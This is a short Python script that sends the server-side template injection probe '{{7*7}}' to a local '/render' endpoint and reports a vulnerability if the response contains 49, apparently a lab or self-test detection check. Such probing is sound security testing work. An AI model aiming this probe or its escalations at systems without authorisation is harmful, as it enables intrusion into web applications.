import requests

URL = "http://127.0.0.1:5000/render"

payload = "{{7*7}}"

print("[+] Testing Server-Side Template Injection...")
print(f"[+] Sending payload: {payload}")

try:
    response = requests.post(
        URL,
        data={"input": payload},
        timeout=10
    )

    print(f"[+] HTTP Status: {response.status_code}")

    if "49" in response.text:
        print("[SUCCESS] SSTI vulnerability detected!")
        print("[+] The expression {{7*7}} was evaluated as 49.")
    else:
        print("[-] Expected result was not found.")
        print("[+] Check the application response.")

except requests.RequestException as error:
    print("[-] Connection failed:")
    print(error)
